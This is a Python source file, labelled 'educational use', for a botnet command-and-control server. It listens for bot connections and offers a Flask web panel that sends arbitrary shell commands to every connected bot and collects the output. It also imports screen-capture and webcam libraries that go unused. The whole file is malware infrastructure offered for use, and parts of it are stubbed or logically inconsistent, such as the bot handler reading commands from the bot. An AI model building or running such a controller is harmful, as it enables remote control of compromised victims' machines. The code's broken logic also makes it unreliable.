# This is only for educational use 

import socket
import threading
import subprocess
import pwd
import pyautogui
import cv2
import shutil
from flask import Flask, render_template, request, jsonify

# The IP address and port of the main host
host = 'YOUR_MAIN_HOST_IP'
port = YOUR_MAIN_HOST_PORT

# List to store the connected bots
connected_bots = []

# Flask app setup
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_command', methods=['POST'])
def send_command():
    command = request.form['command']
    results = send_command_to_bots(command)
    return jsonify(results)

@app.route('/bots_location')
def bots_location():
    locations = get_bots_location()
    return jsonify(locations)

def connect_to_main_host():
    # Connect to the main host
    main_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    main_host.bind((host, port))
    main_host.listen(5)
    print('Main host listening on {}:{}'.format(host, port))

    # Accept incoming connections from bots
    while True:
        bot_socket, bot_address = main_host.accept()

        # Handle the bot connection in a new thread
        bot_thread = threading.Thread(target=handle_bot, args=(bot_socket, bot_address))
        bot_thread.start()

        # Add the bot to the connected_bots list
        connected_bots.append((bot_socket, bot_address))

    # Close the main host
    main_host.close()

def handle_bot(bot_socket, bot_address):
    print('Bot connected:', bot_address)

    # Send commands to the bot and receive results
    while True:
        command = bot_socket.recv(1024).decode()

        if command.lower() == 'exit':
            break
        # Handle other commands

    # Close the connection with the bot
    bot_socket.close()
    print('Bot disconnected:', bot_address)

# Additional Functions

def send_command_to_bots(command):
    results = []
    for bot_socket, bot_address in connected_bots:
        try:
            bot_socket.send(command.encode())
            result = bot_socket.recv(1024).decode()
            results.append({'bot_address': bot_address, 'result': result})
        except:
            results.append({'bot_address': bot_address, 'result': 'Error occurred'})
    return results

def get_bots_location():
    locations = []
    for bot_socket, bot_address in connected_bots:
        # Get the bot location information
        # Add location to the 'locations' list
        locations.append({'bot_address': bot_address, 'lat': 0, 'lng': 0})
    return locations

# Run the main host
if __name__ == '__main__':
    main_thread = threading.Thread(target=connect_to_main_host)
    main_thread.start()
    app.run()

